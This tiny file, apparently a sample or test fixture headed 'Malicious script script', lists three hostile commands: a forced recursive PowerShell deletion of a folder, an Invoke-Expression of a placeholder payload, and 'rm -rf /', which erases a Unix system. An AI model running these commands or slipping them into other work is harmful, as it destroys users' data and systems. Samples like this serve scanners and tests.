# Malicious script script
Remove-Item -Path "C:\RestrictedFolder" -Recurse -Force
Invoke-Expression "iex payload"
rm -rf /
